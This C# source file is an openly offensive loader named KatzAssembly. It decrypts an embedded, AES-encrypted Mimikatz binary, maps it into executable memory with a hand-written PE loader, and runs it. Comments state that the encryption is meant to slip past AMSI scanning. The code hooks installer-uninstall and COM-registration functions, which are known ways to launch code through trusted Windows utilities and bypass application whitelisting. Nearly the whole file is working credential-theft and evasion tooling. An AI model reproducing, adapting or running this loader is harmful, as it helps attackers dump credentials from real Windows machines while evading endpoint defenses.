using System;
using System.EnterpriseServices;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KatzAssembly
{

    class Bypass : ServicedComponent
    {

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            try
            {
                Katz.Exec();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            try
            {
                Katz.Exec();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Console.WriteLine("Hello There From Uninstall");
            try
            {
                Katz.Exec();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }
    }


    public class ClassInteractive : MarshalByRefObject
    {
        public ClassInteractive() 
        {
            Katz.Exec();
        }
    }

    public class ClassSilent : MarshalByRefObject
    {
        public ClassSilent() 
        {
            Katz.ExecSilent();
        }
    }

    public static class Katz
    {
        public static bool Enter = true;

        private const UInt32 StdOutputHandle = 0xFFFFFFF5;
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
        [DllImport("kernel32.dll")]
        private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
        [DllImport("kernel32")]
        static extern bool AllocConsole();

        public static void Main()
        {
            Exec();
        }

        public static void ExecSilent()
        {
            Enter = false;
            Exec();
        }

        [STAThread]
        [System.LoaderOptimization(LoaderOptimization.MultiDomain)]
        public static void Exec()
        {
            AllocConsole();
            //Console.WriteLine("=37=");
            //Console.WriteLine("So, GC now allocated AppDomain, Assembly and Module in memory");
            //Console.WriteLine("Now our AppDomain, Assembly and Module where scanned via AMSI, but no any detections. Why?");
            //Console.WriteLine("Memory stay clear too, because Mimikatz payload, that contains in assembly, are encrypted  :-)");
            Console.WriteLine("Ready for unpack and execute\nEntering red zone - lots of detecable artifacts\n[press enter to unpack & execute Mimikatz]", Console.ForegroundColor = ConsoleColor.Red );
            if (Enter)
                Console.ReadLine();
            byte[] unpacked = null;
            try
            {
                if (IntPtr.Size == 8 ) //x64 Unpack And Execute
                {
                    Console.WriteLine("x64 !! Gocha");
                    unpacked = Misc.Decrypt(Properties.Resources.x64mimikatz);
                }
                else if (IntPtr.Size == 4)
                {
                    Console.WriteLine("x86 !! Gocha");
                    unpacked = Misc.Decrypt(Properties.Resources.Win32mimikatz);
                }

            }
            catch (Exception ex)
            {
                while (ex != null)
                {
                    Console.WriteLine(ex.Message);
                    ex = ex.InnerException;
                }
            }

            Console.WriteLine("Downloaded Latest");
            //Console.ReadLine();
            PELoader pe = new PELoader(unpacked);


            IntPtr codebase = IntPtr.Zero;

            if (pe.Is32BitHeader)
            {
                Console.WriteLine("Pref LA = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader32.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }
            else
            {
                Console.WriteLine("Pref LA = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }

            //Copy Sections
            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {
                IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
            }

            //Perform Base Relocation
            //Calculate Delta
            IntPtr currentbase = codebase;
            long delta;
            if (pe.Is32BitHeader)
            {
                delta = (int)(currentbase.ToInt32() - (int)pe.OptionalHeader32.ImageBase);
            }
            else
            {
                delta = (long)(currentbase.ToInt64() - (long)pe.OptionalHeader64.ImageBase);
            }

            Console.WriteLine("Delta = {0}", delta.ToString("X4"));

            //Modify Memory Based On Relocation Table
            IntPtr relocationTable;
            if (pe.Is32BitHeader)
            {
                relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader32.BaseRelocationTable.VirtualAddress));
            }
            else
            {
                relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
            }


            NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
            relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = relocationTable;
            int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = relocationTable;

            while (true)
            {

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);

                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {

                    IntPtr patchAddr;
                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0x3:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.                            
                            int originalx86Addr = Marshal.ReadInt32(patchAddr);
                            Marshal.WriteInt32(patchAddr, originalx86Addr + (int)delta);
                            break;
                        case 0xA:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.
                            long originalAddr = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, originalAddr + delta);
                            break;

                    }

                }

                offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;

                nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0) break;


            }
            //Resolve Imports

            IntPtr z;
            IntPtr oa1;
            int oa2;

            if (pe.Is32BitHeader)
            {
                z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
            }
            else
            {
                z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
            }

            IntPtr threadStart;
            IntPtr hThread;
            uint cthread = NativeDeclarations.GetCurrentThreadId();
            var t = Task.Run(() =>
            {
                if (pe.Is32BitHeader)
                {
                    int j = 0;
                    while (true) //HardCoded Number of DLL's Do this Dynamically.
                    {
                        IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                        int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                        IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
                        IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                        string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                        if (DllName == "") { break; }

                        IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                        Console.WriteLine("Loaded {0}", DllName);
                        int k = 0;
                        while (true)
                        {
                            IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                            string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                            IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                            Marshal.WriteInt32(a2, (int)funcAddy);
                            a2 = IntPtr.Add(a2, 4);
                            if (DllFuncName == "") break;
                            k++;
                        }
                        j++;
                    }
                    //Transfer Control To OEP
                    Console.WriteLine("Executing Mimikatz");
                    threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                    hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                    NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                }
                else
                {
                    int j = 0;
                    while (true)
                    {
                        IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                        int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                        IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                        IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                        string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                        if (DllName == "") { break; }

                        IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                        Console.WriteLine("Loaded {0}", DllName);
                        int k = 0;
                        while (true)
                        {
                            IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                            string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                            IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                            Marshal.WriteInt64(a2, (long)funcAddy);
                            a2 = IntPtr.Add(a2, 8);
                            if (DllFuncName == "") break;
                            k++;
                        }
                        j++;
                    }
                    Console.WriteLine("Executing Mimikatz");
                    threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                    hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                    NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                }
            });
            t.Wait();
            t.Dispose();
            Console.WriteLine("Mimikatz Thread Complete, still lots of artifacts, including unsafe (\"manually\") allocated memory\n[enter to clear unsafe allocated memory]");
            if (Enter)
                Console.ReadLine();

            NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);
            
            Console.WriteLine("We just freed memory, that allocated manually.");
            Console.WriteLine("Now only safe allocated (GC) AppDomain, Assembly and Module artifacts are in memory\n[enter to finish execution and leave AppDomain, Assembly and Module]");
            if (Enter)
                Console.ReadLine();

        } //End Main



    }//End Program

    class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            Stub = 0x00000000,
        }


        /// The DOS header

        private IMAGE_DOS_HEADER dosHeader;

        /// The file header

        private IMAGE_FILE_HEADER fileHeader;

        /// Optional 32 bit file header 

        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

        /// Optional 64 bit file header 

        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

        /// Image Section headers. Number of sections is in the file header.

        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                RawBytes = System.IO.File.ReadAllBytes(filePath);

            }
        }

        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }


                RawBytes = fileBytes;

            }
        }


        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }



        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes { get; }

    }//End Class

    [SuppressUnmanagedCodeSecurityAttribute]
    unsafe class NativeDeclarations
    {
        
        #region pinvoke flags

        [Flags]
        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }
        #endregion

        

        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public /*unsafe*/ struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }


        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentThreadId();

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, FreeType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(

          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );


        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        
    }

    class Misc
    {
        private static byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data)
        {
            using (var memoryStream = new MemoryStream())
            {
                using (var cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return memoryStream.ToArray();
                }
            }
        }

        static readonly byte[] myIV = Properties.Resources.IV;
        static readonly byte[] myKey = Properties.Resources.key;

        public static byte[] Encrypt(byte[] data)
        {
            Aes _algorithm = Aes.Create();

            using (var encryptor = _algorithm.CreateEncryptor(myKey, myIV))
            {
                return PerformCryptography(encryptor, data);
            }

        }

        public static byte[] Decrypt(byte[] data)
        {
            Aes _algorithm = Aes.Create();
            using (var decryptor = _algorithm.CreateDecryptor(myKey, myIV))
            {
                return PerformCryptography(decryptor, data);
            }

        }

    }//End Misc Class	
}
